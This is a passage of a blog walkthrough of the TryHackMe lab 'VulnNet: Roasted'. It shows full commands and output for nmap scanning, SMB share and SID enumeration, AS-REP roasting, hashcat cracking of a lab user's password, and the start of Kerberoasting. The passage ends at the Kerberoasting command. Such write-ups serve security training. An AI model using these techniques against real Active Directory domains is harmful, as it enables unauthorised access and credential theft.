title=Tags><span>Tags</span></a></li><li><a href=https://geobour98.com/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>TryHackMe - VulnNet: Roasted</h1><div class=post-meta></div></header><div class=post-content><p>ðŸ“† 12/11/2022 - geobour98<br>âŒš 9 min</p><h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2><p>This is a <strong>TryHackMe</strong> room which can be found at:
<a href=https://tryhackme.com/room/vulnnetroasted target=_blank style=color:#e30f0f>VulnNet: Roasted</a></p><p>VulnNet Entertainment quickly deployed another management instance on their very broad network&mldr;</p><h2 id=reconnaissance--scanning>Reconnaissance & Scanning<a hidden class=anchor aria-hidden=true href=#reconnaissance--scanning>#</a></h2><p>Perform <code>nmap</code> scan to identify open ports and services treating the host as online.</p><ul><li>Command: <code>nmap -p- -T4 -Pn -v 10.10.232.200</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ nmap -p- -T4 -Pn -v 10.10.232.200
</span></span><span style=display:flex><span>Starting Nmap 7.93 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-11-08 13:51 EET                                                                                  
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 13:51                                                                                           
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 13:51, 0.00s elapsed                                                                             
</span></span><span style=display:flex><span>Initiating Connect Scan at 13:51                                                                                                                 
</span></span><span style=display:flex><span>Scanning 10.10.232.200 <span style=color:#f92672>(</span>10.10.232.200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span><span style=color:#ae81ff>65535</span> ports<span style=color:#f92672>]</span>                                                                                             
</span></span><span style=display:flex><span>Discovered open port 139/tcp on 10.10.232.200                                                                                                    
</span></span><span style=display:flex><span>Discovered open port 135/tcp on 10.10.232.200                                                                                                    
</span></span><span style=display:flex><span>Discovered open port 53/tcp on 10.10.232.200                                                                                                     
</span></span><span style=display:flex><span>Discovered open port 445/tcp on 10.10.232.200                                                                                                    
</span></span><span style=display:flex><span>Discovered open port 49668/tcp on 10.10.232.200                                                                                                  
</span></span><span style=display:flex><span>Discovered open port 49699/tcp on 10.10.232.200                                                              
</span></span><span style=display:flex><span>Discovered open port 49682/tcp on 10.10.232.200                                                                                      
</span></span><span style=display:flex><span>Discovered open port 5985/tcp on 10.10.232.200                                                                                                   
</span></span><span style=display:flex><span>Discovered open port 49670/tcp on 10.10.232.200                                                                                                  
</span></span><span style=display:flex><span>Discovered open port 464/tcp on 10.10.232.200                                                                                                    
</span></span><span style=display:flex><span>Discovered open port 389/tcp on 10.10.232.200                                                                                                    
</span></span><span style=display:flex><span>Discovered open port 636/tcp on 10.10.232.200                                                                                                    
</span></span><span style=display:flex><span>Discovered open port 88/tcp on 10.10.232.200                                                                                                     
</span></span><span style=display:flex><span>Discovered open port 49665/tcp on 10.10.232.200                                                                                                  
</span></span><span style=display:flex><span>Discovered open port 49669/tcp on 10.10.232.200                                                                                                  
</span></span><span style=display:flex><span>Discovered open port 3269/tcp on 10.10.232.200                                                                                                   
</span></span><span style=display:flex><span>Discovered open port 3268/tcp on 10.10.232.200                                                                                                   
</span></span><span style=display:flex><span>Discovered open port 593/tcp on 10.10.232.200                                                                                                    
</span></span><span style=display:flex><span>Discovered open port 9389/tcp on 10.10.232.200
</span></span><span style=display:flex><span>Completed Connect Scan at 13:53, 167.54s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>65535</span> total ports<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.232.200 <span style=color:#f92672>(</span>10.10.232.200<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.11s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65516</span> filtered tcp ports <span style=color:#f92672>(</span>no-response<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT      STATE SERVICE
</span></span><span style=display:flex><span>53/tcp    open  domain
</span></span><span style=display:flex><span>88/tcp    open  kerberos-sec
</span></span><span style=display:flex><span>135/tcp   open  msrpc
</span></span><span style=display:flex><span>139/tcp   open  netbios-ssn
</span></span><span style=display:flex><span>389/tcp   open  ldap
</span></span><span style=display:flex><span>445/tcp   open  microsoft-ds
</span></span><span style=display:flex><span>464/tcp   open  kpasswd5
</span></span><span style=display:flex><span>593/tcp   open  http-rpc-epmap
</span></span><span style=display:flex><span>636/tcp   open  ldapssl
</span></span><span style=display:flex><span>3268/tcp  open  globalcatLDAP
</span></span><span style=display:flex><span>3269/tcp  open  globalcatLDAPssl
</span></span><span style=display:flex><span>5985/tcp  open  wsman
</span></span><span style=display:flex><span>9389/tcp  open  adws
</span></span><span style=display:flex><span>49665/tcp open  unknown
</span></span><span style=display:flex><span>49668/tcp open  unknown
</span></span><span style=display:flex><span>49669/tcp open  unknown
</span></span><span style=display:flex><span>49670/tcp open  unknown
</span></span><span style=display:flex><span>49682/tcp open  unknown
</span></span><span style=display:flex><span>49699/tcp open  unknown
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 167.62 seconds
</span></span></code></pre></div><p>Perform aggressive <code>nmap</code> scan to enable OS detection, default scripts and version detection on the found ports treating the host as online.</p><ul><li>Command: <code>sudo nmap -A -sC -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -v 10.10.232.200</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ sudo nmap -A -sC -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -v 10.10.232.200 
</span></span><span style=display:flex><span>Starting Nmap 7.93 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-11-08 14:01 EET                                                                                  
</span></span><span style=display:flex><span>NSE: Loaded <span style=color:#ae81ff>155</span> scripts <span style=color:#66d9ef>for</span> scanning.                                                                                                            
</span></span><span style=display:flex><span>NSE: Script Pre-scanning.                                                                                                                        
</span></span><span style=display:flex><span>Initiating NSE at 14:01                                                                                                                          
</span></span><span style=display:flex><span>Completed NSE at 14:01, 0.00s elapsed                                                                                                            
</span></span><span style=display:flex><span>Initiating NSE at 14:01                                                                                                                          
</span></span><span style=display:flex><span>Completed NSE at 14:01, 0.00s elapsed                                                                                                            
</span></span><span style=display:flex><span>Initiating NSE at 14:01                                                                                                                          
</span></span><span style=display:flex><span>Completed NSE at 14:01, 0.00s elapsed                                                                                                            
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 14:01                                                                                           
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 14:01, 0.00s elapsed                                                                             
</span></span><span style=display:flex><span>Initiating SYN Stealth Scan at 14:01                                                                                                             
</span></span><span style=display:flex><span>Scanning 10.10.232.200 <span style=color:#f92672>(</span>10.10.232.200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span><span style=color:#ae81ff>13</span> ports<span style=color:#f92672>]</span>                                                                                                
</span></span><span style=display:flex><span>Discovered open port 445/tcp on 10.10.232.200                                                                                                    
</span></span><span style=display:flex><span>Discovered open port 9389/tcp on 10.10.232.200                                                                                                   
</span></span><span style=display:flex><span>Discovered open port 139/tcp on 10.10.232.200                                                                                                    
</span></span><span style=display:flex><span>Discovered open port 53/tcp on 10.10.232.200                                                                                                     
</span></span><span style=display:flex><span>Discovered open port 135/tcp on 10.10.232.200                                                                                                    
</span></span><span style=display:flex><span>Discovered open port 3269/tcp on 10.10.232.200                                                                                                   
</span></span><span style=display:flex><span>Discovered open port 636/tcp on 10.10.232.200                                                                                                    
</span></span><span style=display:flex><span>Discovered open port 5985/tcp on 10.10.232.200                                                                                                   
</span></span><span style=display:flex><span>Discovered open port 3268/tcp on 10.10.232.200                                                                                                   
</span></span><span style=display:flex><span>Discovered open port 593/tcp on 10.10.232.200
</span></span><span style=display:flex><span>Discovered open port 464/tcp on 10.10.232.200
</span></span><span style=display:flex><span>Discovered open port 389/tcp on 10.10.232.200
</span></span><span style=display:flex><span>Discovered open port 88/tcp on 10.10.232.200
</span></span><span style=display:flex><span>Completed SYN Stealth Scan at 14:01, 0.23s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>13</span> total ports<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating Service scan at 14:01
</span></span><span style=display:flex><span>Scanning <span style=color:#ae81ff>13</span> services on 10.10.232.200 <span style=color:#f92672>(</span>10.10.232.200<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Completed Service scan at 14:01, 13.56s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>13</span> services on <span style=color:#ae81ff>1</span> host<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#1) against 10.10.232.200 (10.10.232.200)</span>
</span></span><span style=display:flex><span>Retrying OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#2) against 10.10.232.200 (10.10.232.200)</span>
</span></span><span style=display:flex><span>Initiating Traceroute at 14:01
</span></span><span style=display:flex><span>Completed Traceroute at 14:01, 0.16s elapsed
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 14:01
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 14:01, 0.00s elapsed
</span></span><span style=display:flex><span>NSE: Script scanning 10.10.232.200.
</span></span><span style=display:flex><span>Initiating NSE at 14:01
</span></span><span style=display:flex><span>Completed NSE at 14:02, 40.05s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 14:02
</span></span><span style=display:flex><span>Completed NSE at 14:02, 2.42s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 14:02
</span></span><span style=display:flex><span>Completed NSE at 14:02, 0.00s elapsed
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.232.200 <span style=color:#f92672>(</span>10.10.232.200<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.11s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE       VERSION 
</span></span><span style=display:flex><span>53/tcp   open  domain        Simple DNS Plus
</span></span><span style=display:flex><span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style=color:#f92672>(</span>server time: 2022-11-08 12:01:20Z<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>135/tcp  open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#f92672>(</span>Domain: vulnnet-rst.local0., Site: Default-First-Site-Name<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>445/tcp  open  microsoft-ds?
</span></span><span style=display:flex><span>464/tcp  open  kpasswd5?
</span></span><span style=display:flex><span>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>636/tcp  open  tcpwrapped
</span></span><span style=display:flex><span>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#f92672>(</span>Domain: vulnnet-rst.local0., Site: Default-First-Site-Name<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>3269/tcp open  tcpwrapped
</span></span><span style=display:flex><span>5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style=color:#f92672>(</span>SSDP/UPnP<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style=display:flex><span>|_http-title: Not Found
</span></span><span style=display:flex><span>9389/tcp open  mc-nmf        .NET Message Framing
</span></span><span style=display:flex><span>Warning: OSScan results may be unreliable because we could not find at least <span style=color:#ae81ff>1</span> open and <span style=color:#ae81ff>1</span> closed port
</span></span><span style=display:flex><span>OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
</span></span><span style=display:flex><span>No OS matches <span style=color:#66d9ef>for</span> host
</span></span><span style=display:flex><span>Network Distance: <span style=color:#ae81ff>2</span> hops
</span></span><span style=display:flex><span>TCP Sequence Prediction: Difficulty<span style=color:#f92672>=</span><span style=color:#ae81ff>259</span> <span style=color:#f92672>(</span>Good luck!<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>IP ID Sequence Generation: Incremental
</span></span><span style=display:flex><span>Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2022-11-08T12:01:35
</span></span><span style=display:flex><span>|_  start_date: N/A
</span></span><span style=display:flex><span>|_clock-skew: -1s
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   311: 
</span></span><span style=display:flex><span>|_    Message signing enabled and required
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>TRACEROUTE <span style=color:#f92672>(</span>using port 445/tcp<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>HOP RTT       ADDRESS
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>   73.06 ms  10.8.0.1 <span style=color:#f92672>(</span>10.8.0.1<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span>   149.15 ms 10.10.232.200 <span style=color:#f92672>(</span>10.10.232.200<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>NSE: Script Post-scanning.
</span></span><span style=display:flex><span>Initiating NSE at 14:02
</span></span><span style=display:flex><span>Completed NSE at 14:02, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 14:02
</span></span><span style=display:flex><span>Completed NSE at 14:02, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 14:02
</span></span><span style=display:flex><span>Completed NSE at 14:02, 0.00s elapsed
</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 61.40 seconds
</span></span><span style=display:flex><span>           Raw packets sent: <span style=color:#ae81ff>97</span> <span style=color:#f92672>(</span>7.976KB<span style=color:#f92672>)</span> | Rcvd: <span style=color:#ae81ff>41</span> <span style=color:#f92672>(</span>2.404KB<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>We notice that the Domain is: <code>vulnnet-rst.local</code>.<br>We can add this domain and its IP in the <code>/etc/hosts</code> file.<br></p><p>We can also try to enumerate the <code>shares</code> and their permissions using <code>smbmap</code>.</p><ul><li>Command: <code>smbmap -H 10.10.232.200 -u anonymous</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ smbmap -H 10.10.232.200 -u anonymous
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Guest session       IP: 10.10.232.200:445    Name: 10.10.232.200                                      
</span></span><span style=display:flex><span>        Disk                                                    Permissions     Comment
</span></span><span style=display:flex><span>        ----                                                    -----------     -------
</span></span><span style=display:flex><span>        ADMIN$                                                  NO ACCESS       Remote Admin
</span></span><span style=display:flex><span>        C$                                                      NO ACCESS       Default share
</span></span><span style=display:flex><span>        IPC$                                                    READ ONLY       Remote IPC
</span></span><span style=display:flex><span>        NETLOGON                                                NO ACCESS       Logon server share 
</span></span><span style=display:flex><span>        SYSVOL                                                  NO ACCESS       Logon server share 
</span></span><span style=display:flex><span>        VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
</span></span><span style=display:flex><span>        VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing
</span></span></code></pre></div><p>After some enumeration on the shares with <code>READ ONLY</code> permissions, we didn&rsquo;t find anything interesting.</p><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>Then, we can use the script <code>lookupsid.py</code> from <code>impacket</code> in order to perform bruteforcing of Windows SID&rsquo;s to identify users/groups on the remote target.</p><ul><li>Command: <code>/opt/impacket/examples/lookupsid.py anonymous@10.10.232.200</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ /opt/impacket/examples/lookupsid.py anonymous@10.10.232.200
</span></span><span style=display:flex><span>Impacket v0.10.0 - Copyright <span style=color:#ae81ff>2022</span> SecureAuth Corporation                                                                                         
</span></span><span style=display:flex><span>                                                                                                                                                 
</span></span><span style=display:flex><span>Password:                                                                                                                                        
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Brute forcing SIDs at 10.10.232.200                                                                                                           
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> StringBinding ncacn_np:10.10.232.200<span style=color:#f92672>[</span><span style=color:#ae81ff>\p</span>ipe<span style=color:#ae81ff>\l</span>sarpc<span style=color:#f92672>]</span>                                                                                            
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Domain SID is: S-1-5-21-1589833671-435344116-4136949213                                                                                      
</span></span><span style=display:flex><span>498: VULNNET-RST<span style=color:#ae81ff>\E</span>nterprise Read-only Domain Controllers <span style=color:#f92672>(</span>SidTypeGroup<span style=color:#f92672>)</span>                                                                          
</span></span><span style=display:flex><span>500: VULNNET-RST<span style=color:#ae81ff>\A</span>dministrator <span style=color:#f92672>(</span>SidTypeUser<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>501: VULNNET-RST<span style=color:#ae81ff>\G</span>uest <span style=color:#f92672>(</span>SidTypeUser<span style=color:#f92672>)</span> 
</span></span><span style=display:flex><span>502: VULNNET-RST<span style=color:#ae81ff>\k</span>rbtgt <span style=color:#f92672>(</span>SidTypeUser<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>512: VULNNET-RST<span style=color:#ae81ff>\D</span>omain Admins <span style=color:#f92672>(</span>SidTypeGroup<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>513: VULNNET-RST<span style=color:#ae81ff>\D</span>omain Users <span style=color:#f92672>(</span>SidTypeGroup<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>514: VULNNET-RST<span style=color:#ae81ff>\D</span>omain Guests <span style=color:#f92672>(</span>SidTypeGroup<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>515: VULNNET-RST<span style=color:#ae81ff>\D</span>omain Computers <span style=color:#f92672>(</span>SidTypeGroup<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>516: VULNNET-RST<span style=color:#ae81ff>\D</span>omain Controllers <span style=color:#f92672>(</span>SidTypeGroup<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>517: VULNNET-RST<span style=color:#ae81ff>\C</span>ert Publishers <span style=color:#f92672>(</span>SidTypeAlias<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>518: VULNNET-RST<span style=color:#ae81ff>\S</span>chema Admins <span style=color:#f92672>(</span>SidTypeGroup<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>519: VULNNET-RST<span style=color:#ae81ff>\E</span>nterprise Admins <span style=color:#f92672>(</span>SidTypeGroup<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>520: VULNNET-RST<span style=color:#ae81ff>\G</span>roup Policy Creator Owners <span style=color:#f92672>(</span>SidTypeGroup<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>521: VULNNET-RST<span style=color:#ae81ff>\R</span>ead-only Domain Controllers <span style=color:#f92672>(</span>SidTypeGroup<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>522: VULNNET-RST<span style=color:#ae81ff>\C</span>loneable Domain Controllers <span style=color:#f92672>(</span>SidTypeGroup<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>525: VULNNET-RST<span style=color:#ae81ff>\P</span>rotected Users <span style=color:#f92672>(</span>SidTypeGroup<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>526: VULNNET-RST<span style=color:#ae81ff>\K</span>ey Admins <span style=color:#f92672>(</span>SidTypeGroup<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>527: VULNNET-RST<span style=color:#ae81ff>\E</span>nterprise Key Admins <span style=color:#f92672>(</span>SidTypeGroup<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>553: VULNNET-RST<span style=color:#ae81ff>\R</span>AS and IAS Servers <span style=color:#f92672>(</span>SidTypeAlias<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>571: VULNNET-RST<span style=color:#ae81ff>\A</span>llowed RODC Password Replication Group <span style=color:#f92672>(</span>SidTypeAlias<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>572: VULNNET-RST<span style=color:#ae81ff>\D</span>enied RODC Password Replication Group <span style=color:#f92672>(</span>SidTypeAlias<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>1000: VULNNET-RST<span style=color:#ae81ff>\W</span>IN-2BO8M1OE1M1$ <span style=color:#f92672>(</span>SidTypeUser<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>1101: VULNNET-RST<span style=color:#ae81ff>\D</span>nsAdmins <span style=color:#f92672>(</span>SidTypeAlias<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>1102: VULNNET-RST<span style=color:#ae81ff>\D</span>nsUpdateProxy <span style=color:#f92672>(</span>SidTypeGroup<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>1104: VULNNET-RST<span style=color:#ae81ff>\e</span>nterprise-core-vn <span style=color:#f92672>(</span>SidTypeUser<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>1105: VULNNET-RST<span style=color:#ae81ff>\a</span>-whitehat <span style=color:#f92672>(</span>SidTypeUser<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>1109: VULNNET-RST<span style=color:#ae81ff>\t</span>-skid <span style=color:#f92672>(</span>SidTypeUser<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>1110: VULNNET-RST<span style=color:#ae81ff>\j</span>-goldenhand <span style=color:#f92672>(</span>SidTypeUser<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>1111: VULNNET-RST<span style=color:#ae81ff>\j</span>-leet <span style=color:#f92672>(</span>SidTypeUser<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>We found some usernames, so we can create a wordlist with <code>usernames</code> in order to use it to <code>ASREPRoasting</code> attack.<br>The wordlist <code>usernames.txt</code> should look like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#a6e22e>WIN</span><span style=color:#f92672>-</span><span style=color:#ae81ff>2</span><span style=color:#a6e22e>BO8M1OE1M1$</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>enterprise</span><span style=color:#f92672>-</span><span style=color:#a6e22e>core</span><span style=color:#f92672>-</span><span style=color:#a6e22e>vn</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>a</span><span style=color:#f92672>-</span><span style=color:#a6e22e>whitehat</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>t</span><span style=color:#f92672>-</span><span style=color:#a6e22e>skid</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>j</span><span style=color:#f92672>-</span><span style=color:#a6e22e>goldenhand</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>j</span><span style=color:#f92672>-</span><span style=color:#a6e22e>leet</span>
</span></span></code></pre></div><p>Then, we execute the script <code>GetNPUsers.py</code> from <code>impacket</code> in order to perform the <code>ASREPRoasting</code> attack, which is used to harvest the non-preauth AS_REP responses for a given list of usernames. These responses will then be encrypted with the user&rsquo;s password, which can then be cracked offline.<br></p><ul><li>Command: <code>/opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.232.200 -usersfile usernames.txt -no-pass vulnnet-rst.local/</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ /opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.232.200 -usersfile usernames.txt -no-pass vulnnet-rst.local/
</span></span><span style=display:flex><span>Impacket v0.10.0 - Copyright <span style=color:#ae81ff>2022</span> SecureAuth Corporation
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> User WIN-2BO8M1OE1M1$ doesn<span style=color:#e6db74>&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[-] User enterprise-core-vn doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> User a-whitehat doesn<span style=color:#e6db74>&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span style=display:flex><span><span style=color:#e6db74>$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:91a27a1253abc7bca67160c568048fd1$1167e38fb3eb84adf9a6748af9139fb43085e118f98bd0997c7ab51d0f8aa163893f1fdc3581e61a8536bc7c87d8799d21e301f821111598369aa5d5adcb398b73e4e1a98b9acd984093080a1d37a16d486596ef4e5063e1a496d6099e6967e0b9ea0407418d65604aee49f2683adc2d786bdc4a348db3c3f0b8596dbfe0ac37a2ecd0af2d7323d152155b610b21bded3d313492a7967ebee48b8f47dba5e1f5e939a2b96b104f0b7dc8f5a2c6b3ed625ace4bbad0ecab95a38787cebdc0a2f1662d7abb7797d1ef78a82807f9159432ec7c976cf5378dd171a22d7d8a76a5aede03ffac4724219391394ea547f204c37ab3f2d89a84
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[-] User j-goldenhand doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> User j-leet doesn<span style=color:#960050;background-color:#1e0010>&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
</span></span></code></pre></div><p>We found the hash for the user <code>t-skid</code>, which we put in a file and crack it with <code>hashcat</code> on mode <code>18200</code>.</p><ul><li>Command: <code>hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ hashcat -m <span style=color:#ae81ff>18200</span> -a <span style=color:#ae81ff>0</span> hash.txt /usr/share/wordlists/rockyou.txt
</span></span><span style=display:flex><span>&lt;snip&gt;
</span></span><span style=display:flex><span>$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:33a9b2294ab57133e1f428724cafeaee$ad62d6b18dcbd50c7a501b186e65e9fe12fbde18015bd1c4748b2dab89db657461d940b1d1afe024e003ed6ef9d9e6f9d2d3566bfdeeeabece7fad7073239b11d4c8cca7641889e380e6e3d150f99595586090c906280737698476b60d7bc888f1d810adc3a5b69239e16e745c0cd091365736a42baf9e9428dd0fcfd83a6d038d82bcd5a3c87e42f6c277f1a8ed384c555052498a3b478cdad4fb22f2f7685a0b0fd837725ddadcb6640fa46b53502b24f2be59e1e120a872e0de0fd3544590bfb905eb435833339dc28c9adc06b6ec795dedb775db071b479a32aee442460ae2ad1631e7eed0097a539e59f07e6517562e7b7dabb1:tj072889*
</span></span><span style=display:flex><span>&lt;snip&gt;
</span></span></code></pre></div><p>So, the cleartext password for <code>t-skid</code> is <code>tj072889*</code>.</p><p>Now, we can perform the <code>Kerberoasting</code> attack, which attempts to fetch Service Principal Names that are associated with normal user accounts. A ticket that is encrypted with the user accountâ€™s password is returned, which can then be bruteforced offline.</p><ul><li>Command: <code>/opt/impacket/examples/GetUserSPNs.py vulnnet-rst.local/t-skid:'tj072889*' -dc-ip 10.10.232.200 -request</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ /opt/impacket/examples/GetUserSPNs.py vulnnet-rst.local/t-skid:<span style=color:#e6db74>&#39;tj072889*&#39;</span> -dc-ip 10.10.232.200 -request
